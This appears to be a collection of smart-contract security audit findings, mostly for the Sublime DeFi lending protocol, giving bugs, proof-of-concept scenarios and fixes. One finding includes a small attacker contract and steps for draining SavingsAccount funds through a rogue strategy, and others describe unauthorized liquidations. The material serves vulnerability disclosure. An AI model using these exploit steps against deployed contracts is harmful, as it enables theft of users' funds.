<https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Auction.sol#L89:#L99>

```solidity
uint256 a = factory.auctionMultiplier() * basket.ibRatio();
uint256 b = (bondTimestamp - auctionStart) * BASE / factory.auctionDecrement();
uint256 newRatio = a - b;

for (uint256 i = 0; i < pendingWeights.length; i++) {
    uint256 tokensNeeded = basketAsERC20.totalSupply() * pendingWeights[i] * newRatio / BASE / BASE;
    require(IERC20(pendingTokens[i]).balanceOf(address(basket)) >= tokensNeeded);
}
```

The function verifies that `pendingTokens[i].balanceOf(basket) >= basketAsERC20.totalSupply() * pendingWeights[i] * newRatio / BASE / BASE`. This is the formula that will be used later to mint/burn/withdraw user funds.
As bondTimestamp increases, newRatio will get smaller, and there is no check on this.
After a while we'll arrive at a point where `newRatio ~= 0`, so `tokensNeeded = newRatio*(...) ~= 0`, so the attacker could withdraw nearly all the tokens using outputTokens and outputWeights, and leave just scraps in the basket.

#### Tools Used

Manual analysis, hardhat.

#### Recommended Mitigation Steps

Your needed condition/math might be different, and you might also choose to burn the bond while you're at it, but I think at the minimum you should add a sanity check in settleAuction:

    require (newRatio > basket.ibRatio());"
61.md,"In `CreditLine#_borrowTokensToLiquidate`, oracle is used wrong way",high,"Current implementation to get the price is as follows:

`(uint256 _ratioOfPrices, uint256 _decimals) = IPriceOracle(priceOracle).getLatestPrice(_borrowAsset, _collateralAsset);`

<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L1050>

But it should not consult `borrowToken / collateralToken`, rather it should consult the inverse of this result. As a consequence, in `liquidate` the liquidator/lender can lose/gain funds as a result of this miscalculation.

#### Mitigation step

Replace it with

`(uint256 _ratioOfPrices, uint256 _decimals) = IPriceOracle(priceOracle).getLatestPrice(_collateralAsset, _borrowAsset);`"
61.md,Wrong returns of `SavingsAccountUtil.depositFromSavingsAccount()` can cause fund loss,high,"The function `SavingsAccountUtil.depositFromSavingsAccount()` is expected to return the number of equivalent shares for given `_asset`.

<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L225-L267>

```solidity
/**
 * @notice internal function used to get amount of collateral deposited to the pool
 * @param _fromSavingsAccount if true, collateral is transferred from _sender's savings account, if false, it is transferred from _sender's wallet
 * @param _toSavingsAccount if true, collateral is transferred to pool's savings account, if false, it is withdrawn from _sender's savings account
 * @param _asset address of the asset to be deposited
 * @param _amount amount of tokens to be deposited in the pool
 * @param _poolSavingsStrategy address of the saving strategy used for collateral deposit
 * @param _depositFrom address which makes the deposit
 * @param _depositTo address to which the tokens are deposited
 * @return _sharesReceived number of equivalent shares for given _asset
 */
function _deposit(
    bool _fromSavingsAccount,
    bool _toSavingsAccount,
    address _asset,
    uint256 _amount,
    address _poolSavingsStrategy,
    address _depositFrom,
    address _depositTo
) internal returns (uint256 _sharesReceived) {
    if (_fromSavingsAccount) {
        _sharesReceived = SavingsAccountUtil.depositFromSavingsAccount(
            ISavingsAccount(IPoolFactory(poolFactory).savingsAccount()),
            _depositFrom,
            _depositTo,
            _amount,
            _asset,
            _poolSavingsStrategy,
            true,
            _toSavingsAccount
        );
    } else {
        _sharesReceived = SavingsAccountUtil.directDeposit(
            ISavingsAccount(IPoolFactory(poolFactory).savingsAccount()),
            _depositFrom,
            _depositTo,
            _amount,
            _asset,
            _toSavingsAccount,
            _poolSavingsStrategy
        );
    }
}
```

However, since `savingsAccountTransfer()` does not return the result of `_savingsAccount.transfer()`, but returned `_amount` instead, which means that `SavingsAccountUtil.depositFromSavingsAccount()` may not return the actual shares (when pps is not 1).

<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/SavingsAccount/SavingsAccountUtil.sol#L11-L26>

```solidity
function depositFromSavingsAccount(
    ISavingsAccount _savingsAccount,
    address _from,
    address _to,
    uint256 _amount,
    address _token,
    address _strategy,
    bool _withdrawShares,
    bool _toSavingsAccount
) internal returns (uint256) {
    if (_toSavingsAccount) {
        return savingsAccountTransfer(_savingsAccount, _from, _to, _amount, _token, _strategy);
    } else {
        return withdrawFromSavingsAccount(_savingsAccount, _from, _to, _amount, _token, _strategy, _withdrawShares);
    }
}
```

<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/SavingsAccount/SavingsAccountUtil.sol#L66-L80>

```solidity
function savingsAccountTransfer(
    ISavingsAccount _savingsAccount,
    address _from,
    address _to,
    uint256 _amount,
    address _token,
    address _strategy
) internal returns (uint256) {
    if (_from == address(this)) {
        _savingsAccount.transfer(_amount, _token, _strategy, _to);
    } else {
        _savingsAccount.transferFrom(_amount, _token, _strategy, _from, _to);
    }
    return _amount;
}
```

As a result, the recorded `_sharesReceived` can be wrong.

<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L207-L223>

```solidity
function _depositCollateral(
    address _depositor,
    uint256 _amount,
    bool _transferFromSavingsAccount
) internal nonReentrant {
    uint256 _sharesReceived = _deposit(
        _transferFromSavingsAccount,
        true,
        poolConstants.collateralAsset,
        _amount,
        poolConstants.poolSavingsStrategy,
        _depositor,
        address(this)
    );
    poolVariables.baseLiquidityShares = poolVariables.baseLiquidityShares.add(_sharesReceived);
    emit CollateralAdded(_depositor, _amount, _sharesReceived);
}
```

##### PoC

Given:

*   the price per share of yearn USDC vault is `1.2`

1.  Alice deposited `12,000 USDC` to `yearn` strategy, received `10,000` share tokens;
2.  Alice created a pool, and added all the `12,000 USDC` from the saving account as collateral; The recorded `CollateralAdded` got the wrong number: `12000` which should be `10000`;
3.  Alice failed to borrow money with the pool and tries to `cancelPool()`, it fails as the recorded collateral `shares` are more than the actual collateral.

As a result, Alice has lost all the `12,000 USDC`.

If Alice managed to borrow with the pool, when the loan defaults, the liquidation will also fail, and cause fund loss to the lenders.

##### Recommendation

Change to:

```solidity
function savingsAccountTransfer(
    ISavingsAccount _savingsAccount,
    address _from,
    address _to,
    uint256 _amount,
    address _token,
    address _strategy
) internal returns (uint256) {
    if (_from == address(this)) {
        return _savingsAccount.transfer(_amount, _token, _strategy, _to);
    } else {
        return _savingsAccount.transferFrom(_amount, _token, _strategy, _from, _to);
    }
}
```"
61.md,denial of service,high,"<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/Pool/Pool.sol#L645>
if the borrow token is address(0) (ether), and someone calls withdrawLiquidity, it calls SavingsAccountUtil.transferTokens which will transfer to msg.sender, msg.value (of withdrawLiquidity, because it's an internal function). In other words, the liquidity provided will pay to themselves and their liquidity tokens will still be burned. therefore they will never be able to get their funds back.

#### Recommended Mitigation Steps

the bug is in
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccountUtil.sol>
It is wrong to use msg.value in transferTokens because it'll be the msg.value of the calling function.
therefore every transfer of ether using this function is wrong and dangerous, the solution is to remove all msg.value from this function and just transfer \_amount regularly.

**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2021-12-sublime-findings/issues/154) **"
61.md,Yearn token <> shares conversion decimal issue,high,"The yearn strategy `YearnYield` converts shares to tokens by doing `pricePerFullShare * shares / 1e18`:

    function getTokensForShares(uint256 shares, address asset) public view override returns (uint256 amount) {
        if (shares == 0) return 0;
        // @audit should divided by vaultDecimals 
        amount = IyVault(liquidityToken[asset]).getPricePerFullShare().mul(shares).div(1e18);
    }

But Yearn's `getPricePerFullShare` seems to be [in `vault.decimals()` precision](https://github.com/yearn/yearn-vaults/blob/03b42dacacec2c5e93af9bf3151da364d333c222/contracts/Vault.vy#L1147), i.e., it should convert it as `pricePerFullShare * shares / (10 ** vault.decimals())`.
The vault decimals are the same [as the underlying token decimals](https://github.com/yearn/yearn-vaults/blob/03b42dacacec2c5e93af9bf3151da364d333c222/contracts/Vault.vy#L295-L296)

#### Impact

The token and shares conversions do not work correctly for underlying tokens that do not have 18 decimals.
Too much or too little might be paid out leading to a loss for either the protocol or user.

#### Recommended Mitigation Steps

Divide by `10**vault.decimals()` instead of `1e18` in `getTokensForShares`.
Apply a similar fix in `getSharesForTokens`."
61.md,Aave's share tokens are rebasing breaking current strategy code,high,"When depositing into Aave through the `AaveYield.lockTokens` contract strategy, one receives the `sharesReceived` amount corresponding to the diff of `aToken` balance, which is just always the deposited amount as aave is a rebasing token and `1.0 aToken = 1.0 underlying` at each deposit / withdrawal.

Note that this `sharesReceived` (the underlying deposit amount) is cached in a `balanceInShares` map in `SavingsAccount.deposit` which makes this share *static* and not dynamically rebasing anymore:

```solidity
function deposit(
    uint256 _amount,
    address _token,
    address _strategy,
    address _to
) external payable override nonReentrant returns (uint256) {
    require(_to != address(0), 'SavingsAccount::deposit receiver address should not be zero address');
    uint256 _sharesReceived = _deposit(_amount, _token, _strategy);
    balanceInShares[_to][_token][_strategy] = balanceInShares[_to][_token][_strategy].add(_sharesReceived);
    emit Deposited(_to, _sharesReceived, _token, _strategy);
    return _sharesReceived;
}

function getTokensForShares(uint256 shares, address asset) public view override returns (uint256 amount) {
    if (shares == 0) return 0;
    address aToken = liquidityToken(asset);

    (, , , , , , , uint256 liquidityIndex, , ) = IProtocolDataProvider(protocolDataProvider).getReserveData(asset);

    // @audit-info tries to do (user shares / total shares) * underlying amount where underlying amount = scaledBalance * liquidityIndex
    amount = IScaledBalanceToken(aToken).scaledBalanceOf(address(this)).mul(liquidityIndex).mul(shares).div(
        IERC20(aToken).balanceOf(address(this))
    );
}
```

However, the `getTokensForShares` function uses a rebasing total share supply of `IERC20(aToken).balanceOf(this)`.

###### POC

*   SavingsAccount deposits 1000 DAI for user and user receives 1000 aDAI as shares. These shares are cached in `balanceInShares[user][dai][aave]`.
*   Time passes, Aave accrues interest for lenders, and the initial 1000 aTokens balance has rebased to 1200 aTokens
*   SavingsAccount `withdraw`s 1000 aDAI shares for user which calls `AaveYield.unlockTokens`. The user receives only 1000 DAI. The interest owed to the user is not paid out.
*   Note that `getTokensForShares` also returns the wrong amount as `1200 * 1000 / 1200 = 1000`

#### Impact

Interest is not paid out to users.
Pool collateral is measured without the interest accrued as it uses `getTokensForShares` which will lead to early liquidations and further loss.

#### Recommended Mitigation Steps

If the user shares are not rebasing, you cannot have the ""total shares supply"" (the shares in the contract) be rebasing as in `getTokensForShares`. Also withdrawing the share amount directly from Aave as in `_withdrawERC` does not withdraw the yield.
A fix could be to create a *non-rebasing* wrapper LP token that is paid out to the user proportional to the current strategy TVL at time of user deposit."
61.md,Anyone can liquidate credit line when autoLiquidation is false without supplying borrow tokens,high,"#### Impact

It is intended that if a credit line has autoLiquidation as false, then only the lender can be the liquidator (see docs here: <https://docs.sublime.finance/sublime-docs/smart-contracts/creditlines>). However, this is not correctly implemented, and anyone can liquidate a position that has autoLiquidation set to false.

Even worse, when autoLiquidation is set to false, the liquidator does not have to supply the initial amount of borrow tokens (determined by `_borrowTokensToLiquidate`) that normally have to be transferred when autoLiquidation is true. This means that the liquidator will be sent all of the collateral that is supposed to be sent to the lender, so this represents a huge loss to the lender. Since the lender will lose all of the collateral that they are owed, this is a high severity issue.

#### Proof of Concept

The current implementation of liquidate is here: <https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L996>.

Notice that the autoLiquidation value is only used in one place within this function, which is in this segment of the code:
```solidity
...
    if (creditLineConstants[_id].autoLiquidation && _lender != msg.sender) {
        uint256 _borrowTokens = _borrowTokensToLiquidate(_borrowAsset, _collateralAsset, _totalCollateralTokens);
        if (_borrowAsset == address(0)) {
            uint256 _returnETH = msg.value.sub(_borrowTokens, 'Insufficient ETH to liquidate');
            if (_returnETH != 0) {
                (bool success, ) = msg.sender.call{value: _returnETH}('');
                require(success, 'Transfer fail');
            }
        } else {
        IERC20(_borrowAsset).safeTransferFrom(msg.sender, _lender, _borrowTokens);
        }
    }
    
    _transferCollateral(_id, _collateralAsset, _totalCollateralTokens, _toSavingsAccount); 
    emit  CreditLineLiquidated(_id, msg.sender);
}
```

So, if `autoLiquidation` is false, the code inside of the if statement will simply not be executed, and there are no further checks that the sender HAS to be the lender if `autoLiquidation` is false. This means that anyone can liquidate a non-autoLiquidation credit line, and receive all of the collateral without first transferring the necessary borrow tokens.

For a further proof of concept, consider the test file here: <https://github.com/code-423n4/2021-12-sublime/blob/main/test/CreditLines/2.spec.ts>. If the code on line 238 is changed from `let  _autoLiquidation: boolean  =  true;` to `let  _autoLiquidation: boolean  =  false;`, all the test cases will still pass. This confirms the issue, as the final test case ""Liquidate credit line"" has the `admin` as the liquidator, which should not work in non-autoLiquidations since they are not the lender.

#### Tools Used

Inspection and confirmed with Hardhat.

#### Recommended Mitigation Steps

Add the following require statement somewhere in the `liquidate` function:
```solidity
require(
    creditLineConstants[_id].autoLiquidation || 
    msg.sender == creditLineConstants[_id].lender,
    ""not autoLiquidation and not lender"");
```

#### [ritik99 (Sublime) labeled](https://github.com/code-423n4/2021-12-sublime-findings/issues/96) sponsor confirmed"
61.md,SavingsAccount withdrawAll and switchStrategy can freeze user funds by ignoring possible strategy liquidity issues,high,"### Impact

Full withdrawal and moving funds between strategies can lead to wrong accounting if the corresponding market has tight liquidity, which can be the case at least for `AaveYield`. That is, as the whole amount is required to be moved at once from Aave, both `withdrawAll` and `switchStrategy` will incorrectly account for partial withdrawal as if it was full whenever the corresponding underlying yield pool had liquidity issues.

`withdrawAll` will delete user entry, locking the user funds in the strategy: user will get partial withdrawal and have the corresponding accounting entry removed, while the remaining actual funds will be frozen within the system.

`switchStrategy` will subtract full number of shares for the `_amount` requested from the old strategy, while adding lesser partial number of shares for `_tokensReceived` to the new one with the same effect of freezing user's funds within the system.

#### Proof of Concept

SavingsAccount.withdrawAll
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L286>

SavingsAccount.switchStrategy:
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L152>

When full withdrawal or strategy switch is performed it is one withdraw via `unlockTokens` without checking the amount received.

In the same time the withdraw can fail for example for the strategy switch if old strategy is having liquidity issues at the moment, i.e. Aave market is currently have utilization rate too high to withdraw the amount requested given current size of the lending pool.

Aave `unlockTokens` return is correctly not matched with amount requested:
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/yield/AaveYield.sol#L217>

But, for example, `withdrawAll` ignores the fact that some funds can remain in the strategy and deletes the use entry after one withdraw attempt:
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L294>
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L312>

`switchStrategy` removes the old entry completely:
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L181>

#### Recommended Mitigation Steps

For both `withdrawAll` and `switchStrategy` the immediate fix is to account for tokens received in both cases, which are `_amount` after `unlockTokens` for `withdrawAll` and `_tokensReceived` for `switchStrategy`.

More general handling of the liquidity issues ideally to be addressed architecturally, given the potential issues with liquidity availability any strategy withdrawals can be done as follows:

1.  Withdraw what is possible on demand, leave the amount due as is, i.e. do not commit to completing the action in one go and notify the user the action was partial (return actual amount)
2.  Save to query and repeat for the remainder funds on the next similar action (this can be separate flag triggered mode)"
61.md,Possibility to drain SavingsAccount contract assets,high,"#### Impact

A malicious actor can manipulate switchStrategy() function in a way to withdraw tokens that are locked in SavingsAccount contract
(the risk severity should be reviewed)

#### Proof of Concept

Firstly an attacker need to deploy a rogue strategy contract implementing IYield.getSharesForTokens() and IYield.unlockTokens() functions
and calling switchStrategy() with \_currentStrategy = ROGUE_CONTRACT_ADDRESS (\_newStrategy can be any valid strategy e.g. NoYield)

<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L160>
```solidity
require(_amount != 0, 'SavingsAccount::switchStrategy Amount must be greater than zero');
```
Bypass this check by setting \_amount > 0, since it will be overwritten in line
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L162>
```solidity
_amount = IYield(_currentStrategy).getSharesForTokens(_amount, _token);
```
getSharesForTokens() should be implemented to always return 0, hence to bypass the overflow in lines
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L164-L167>
```solidity
balanceInShares[msg.sender][_token][_currentStrategy] = balanceInShares[msg.sender][_token][_currentStrategy].sub(
_amount,
'SavingsAccount::switchStrategy Insufficient balance'
);
```
since balanceInShares\[msg.sender]\[\_token]\[\_currentStrategy] == 0 and 0-0 will not overflow

The actual amount to be locked is saved in line
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L169>
```solidity
uint256 _tokensReceived = IYield(_currentStrategy).unlockTokens(_token, _amount);
```
the rouge unlockTokens() can check asset balance of the contract and return the full amount

After that some adjustment are made to set approval for the token or to handle native assets case
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L171-L177>
```solidity
uint256 _ethValue;
if (_token != address(0)) {
    IERC20(_token).safeApprove(_newStrategy, _tokensReceived);
} else {
    _ethValue = _tokensReceived;
}
_amount = _tokensReceived;
```
Finally the assets are locked in the locked strategy and shares are allocated on attackers acount
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L179-L181>
```solidity

uint256 _sharesReceived = IYield(_newStrategy).lockTokens{value: _ethValue}(address(this), _token, _tokensReceived);

balanceInShares[msg.sender][_token][_newStrategy] = balanceInShares[msg.sender][_token][_newStrategy].add(_sharesReceived);
```

Proof of Concept

```solidity
import ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";

contract Attacker{
    function getSharesForTokens(uint256 amount, address token) external payable  returns(uint256){
        return 0;
    }
    function unlockTokens(address token, uint256 amount) external payable returns(uint256){
        uint256 bal;
        if(token == address(0))
            bal = msg.sender.balance;
        else
            bal = IERC20(token).balanceOf(msg.sender);
        return bal;
    }
}
```
#### Recommended Mitigation Steps

Add a check for \_currentStrategy to be from strategy list like the one in line
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccount.sol#L159>

    require(IStrategyRegistry(strategyRegistry).registry(_newStrategy), 'SavingsAccount::_newStrategy do not exist');


```solidity
bal = IERC20(token).balanceOf(msg.sender);
```"
61.md,`PriceOracle` Does Not Filter Price Feed Outliers,high,"#### Impact

If for whatever reason the Chainlink oracle returns a malformed price due to oracle manipulation or a malfunctioned price, the result will be passed onto users, causing unintended consequences as a result.

In the same time it's possible to construct mitigation mechanics for such cases, so user economics be affected by sustainable price movements only. As price outrages provide a substantial attack surface for the project it's worth adding some complexity to the implementation.

#### Proof of Concept

<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/PriceOracle.sol#L149-L161>
```solidity
function getLatestPrice(address num, address den) external view override returns (uint256, uint256) {
    uint256 _price;
    uint256 _decimals;
    (_price, _decimals) = getChainlinkLatestPrice(num, den);
    if (_decimals != 0) {
        return (_price, _decimals);
    }
    (_price, _decimals) = getUniswapLatestPrice(num, den);
    if (_decimals != 0) {
        return (_price, _decimals);
    }
    revert(""PriceOracle::getLatestPrice - Price Feed doesn't exist"");
}
```
The above code outlines how prices are utilised regardless of their actual value (assuming it is always a non-zero value).

#### Recommended Mitigation Steps

Consider querying both the Chainlink oracle and Uniswap pool for latest prices, ensuring that these two values are within some upper/lower bounds of each other. It may also be useful to track historic values and ensure that there are no sharp changes in price. However, the first option provides a level of simplicity as UniswapV3's TWAP implementation is incredibly resistant to flash loan attacks. Hence, the main issue to address is a malfunctioning Chainlink oracle."
61.md,Wrong implementation of `NoYield.sol#emergencyWithdraw()`,high,"<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/NoYield.sol#L78-L83>

```solidity
function emergencyWithdraw(address _asset, address payable _wallet) external onlyOwner returns (uint256 received) {
    require(_wallet != address(0), 'cant burn');
    uint256 amount = IERC20(_asset).balanceOf(address(this));
    IERC20(_asset).safeTransfer(_wallet, received);
    received = amount;
}
```

`received` is not being assigned prior to L81, therefore, at L81, `received` is `0`.

As a result, the `emergencyWithdraw()` does not work, in essence.

##### Recommendation

Change to:

```solidity
function emergencyWithdraw(address _asset, address payable _wallet) external onlyOwner returns (uint256 received) {
    require(_wallet != address(0), 'cant burn');
    received = IERC20(_asset).balanceOf(address(this));
    IERC20(_asset).safeTransfer(_wallet, received);
}
```"
61.md,Unable To Call `emergencyWithdraw` ETH in `NoYield` Contract,high,"#### Impact

The `emergencyWithdraw` function is implemented in all yield sources to allow the `onlyOwner` role to drain the contract's balance in case of emergency. The contract considers ETH as a zero address asset. However, there is a call made on `_asset` which will revert if it is the zero address. As a result, ETH tokens can never be withdrawn from the `NoYield` contract in the event of an emergency.

#### Proof of Concept

Consider the case where `_asset == address(0)`. An external call is made to check the contract's token balance for the target `_asset`. However, this call will revert as `_asset` is the zero address. As a result, the `onlyOwner` role will never be able to withdraw ETH tokens during an emergency.
```solidity
function emergencyWithdraw(address _asset, address payable _wallet) external onlyOwner returns (uint256 received) {
    require(_wallet != address(0), 'cant burn');
    uint256 amount = IERC20(_asset).balanceOf(address(this));
    IERC20(_asset).safeTransfer(_wallet, received);
    received = amount;
}
```
Affected function as per below:
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/yield/NoYield.sol#L78-L83>

#### Recommended Mitigation Steps

Consider handling the case where `_asset` is the zero address, i.e. the asset to be withdrawn under emergency is the ETH token."
61.md,Ether can be locked in the `PoolFactory` contract without a way to retrieve it,medium,"If a borrower calls the `createPool` function with a non-zero value, but also includes an ERC20 token address for `_collateralToken`, then the Ether value sent will be locked in the `PoolFactory` contract forever.

*   [createPool L260-317](https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/Pool/PoolFactory.sol#L260-L317)

In the `_createPool` function, a `_collateralToken` address other than the zero address will set the `amount` variable to zero. That `amount` variable will be passed to `create2` which will send 0 wei to the newly created `Pool` contract.

```solidity
// _createPool L349
uint256 amount = _collateralToken == address(0) ? _collateralAmount : 0;
```

#### Impact

A borrower can accidentally lock Ether in the `PoolFactory` without the ability to retrieve it.

#### Proof of Concept

A borrower reuses a script they made to create a pool and deposit collateral. They intend to deposit Ether as collateral so they send value with the transaction, but forget to change the `_collateralToken` address to address(0). The `Pool` contract will be deployed using the `_collateralToken`, and will lock the Ether sent in the `PoolFactory`

#### Tools Used

Manual analysis and Hardhat.

#### Recommended Mitigation Steps

If msg.value is greater than 0, make sure the `_collateralToken` address is set to address(0)."
61.md,CreditLine.liquidate doesn't transfer borrowed ETH to a lender,medium,"#### Impact

Funds that are acquired from a liquidator and should be sent to a lender are left with the contract instead. The funds aren't lost, but after the fact mitigation will require manual accounting and fund transfer for each CreditLine.liquidate usage.

#### Proof of Concept

ETH sent to CreditLine.liquidate by an external liquidator when `autoLiquidation` is enabled remain with the contract and aren't transferred to the lender:
<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/CreditLine/CreditLine.sol#L1015>

#### Recommended Mitigation Steps

Add transfer to a lender for ETH case:

Now:
```solidity

if (_borrowAsset == address(0)) {
        uint256 _returnETH = msg.value.sub(_borrowTokens, 'Insufficient ETH to liquidate');
        if (_returnETH != 0) {
                (bool success, ) = msg.sender.call{value: _returnETH}('');
                require(success, 'Transfer fail');
        }
}
```
To be:
```solidity

if (_borrowAsset == address(0)) {
        uint256 _returnETH = msg.value.sub(_borrowTokens, 'Insufficient ETH to liquidate');
        
        (bool success, ) = _lender.call{value: _borrowTokens}('');
        require(success, 'liquidate: Transfer failed');
        
        if (_returnETH != 0) {
                (success, ) = msg.sender.call{value: _returnETH}('');
                require(success, 'liquidate: Return transfer failed');
        }
}
```"
61.md,Collateral can be deposited in a finished pool,medium,"#### Proof of Concept

The depositCollateral function doesn't check the status of the pool so collateral can be deposited in a finished loan. This can happen by mistake and all funds will be lost.

<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L207>

#### Recommended Mitigation Steps

Require loan status to be collection or active in the depositCollateral function."
61.md,Unlinked address can link immediately again,medium,"#### Impact

After a master calls unlinkAddress() to unlink an address, the address that has just been unlinked can directly link again without permission.
The address that is just unlinked can call linkAddress(masterAddress) which will execute because pendingLinkAddresses is still set.
Assuming the master has unlinked for a good reason it is unwanted to be able to be linked again without any permission from the master.

Note: a master can prevent this by calling cancelAddressLinkingRequest(), but this doesn't seem logical to do

#### Proof of Concept

<https://github.com/code-423n4/2021-12-sublime/blob/e688bd6cd3df7fefa3be092529b4e2d013219625/contracts/Verification/Verification.sol#L129-L154>

```solidity
    function unlinkAddress(address _linkedAddress) external {
        address _linkedTo = linkedAddresses[_linkedAddress].masterAddress;
        require(_linkedTo != address(0), 'V:UA-Address not linked');
        require(_linkedTo == msg.sender, 'V:UA-Not linked to sender');
        delete linkedAddresses[_linkedAddress]; 
       ...
}
    function linkAddress(address _masterAddress) external {
        require(linkedAddresses[msg.sender].masterAddress == address(0), 'V:LA-Address already linked');   // == true (after unlinkAddress)
        require(pendingLinkAddresses[msg.sender][_masterAddress], 'V:LA-No pending request');                 // == true (after unlinkAddress)
        _linkAddress(msg.sender, _masterAddress);                                                                                           // // pendingLinkAddresses not reset
    }

function cancelAddressLinkingRequest(address _linkedAddress) external {
        ... 
        delete pendingLinkAddresses[_linkedAddress][msg.sender]; // only location where pendingLinkAddresses is reset
```

#### Recommended Mitigation Steps

Add something like to following at the end of linkAddress:

```solidity
delete pendingLinkAddresses[msg.sender][_masterAddress]; 
```"
61.md,Extension voting threshold check needs to rerun on each transfer,medium,"The `Extension` contract correctly reduces votes from the `from` address of a transfer and adds it to the `to` address of the transfer (in case both of them voted on it before), but it does not rerun the voting logic in `voteOnExtension` that actually grants the extension.
This leads to issues where an extension should be granted but is not:

###### POC

*   `to` address has 100 tokens and votes for the extension
*   `from` address has 100 tokens but does not vote for the extension and transfers the 100 tokens to `to`
*   `to` now has 200 tokens, `removeVotes` is run, the `totalExtensionSupport` is increased by 100 to 200. In theory, the threshold is reached and the vote should pass if `to` could call `voteOnExtension` again.
*   But their call to `voteOnExtension` with the new balance will fail as they already voted on it (`lastVotedExtension == _extensionVoteEndTime`). The extension is not granted.

#### Impact

Extensions that should be granted after a token transfer are not granted.

#### Recommended Mitigation Steps

Rerun the threshold logic in `removeVotes` as it has the potential to increase the total support if `to` voted for the extension but `from` did not."
61.md,`NoYield.sol` Tokens with fee on transfer are not supported,medium,"There are ERC20 tokens that charge fee for every `transfer()` or `transferFrom()`.

In the current implementation, `NoYield.sol#lockTokens()` assumes that the received amount is the same as the transfer amount, and uses it to calculate `sharesReceived` amounts.

As a result, in `unlockTokens()`, later users may not be able to successfully withdraw their tokens, as it may revert at L141 for insufficient balance.

<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/NoYield.sol#L93-L106>

```solidity
function lockTokens(
    address user,
    address asset,
    uint256 amount
) external payable override onlySavingsAccount nonReentrant returns (uint256 sharesReceived) {
    require(amount != 0, 'Invest: amount');
    if (asset != address(0)) {
        IERC20(asset).safeTransferFrom(user, address(this), amount);
    } else {
        require(msg.value == amount, 'Invest: ETH amount');
    }
    sharesReceived = amount;
    emit LockedTokens(user, asset, sharesReceived);
}
```

<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/NoYield.sol#L134-L144>

```solidity
function _unlockTokens(address asset, uint256 amount) internal returns (uint256 received) {
    require(amount != 0, 'Invest: amount');
    received = amount;
    if (asset == address(0)) {
        (bool success, ) = savingsAccount.call{value: received}('');
        require(success, 'Transfer failed');
    } else {
        IERC20(asset).safeTransfer(savingsAccount, received);
    }
    emit UnlockedTokens(asset, received);
}
```

##### Recommendation

Consider comparing before and after balance to get the actual transferred amount."
61.md,AaveYield: Misspelled external function name making functions fail,medium,"#### Impact

In `AaveYield.sol` the functions:

*   `liquidityToken`
*   `_withdrawETH`
*   `_depositETH`

Make a conditional call to `IWETHGateway(wethGateway).getAWETHAddress()`

This function does not exist in the `wethGateway` contract, causing these function to fail with the error `""Fallback not allowed""`.

The function they should be calling is `getWethAddress()` without the ""A"".

Small yet dangerous typo.

##### Mitigation Steps

Simply modify:

`IWETHGateway(wethGateway).getAWETHAddress()`

to:

`IWETHGateway(wethGateway).getWETHAddress()`

In the functions mentioned above."
61.md,Missing approve(0),medium,"#### Impact

There are 3 instances where the `IERC20.approve()` function is called only once without setting the allowance to zero. Some tokens, like USDT, require first reducing the address' allowance to zero by calling `approve(_spender, 0)`. Transactions will revert when using an unsupported token like USDT (see the `approve()` function requirement [at line 199](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code)).

#### Proof of Concept

*   [CreditLine/CreditLine.sol:647](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L647)
*   [CreditLine/CreditLine.sol:779](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L779)
*   [yield/AaveYield.sol:324](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/AaveYield.sol#L324)

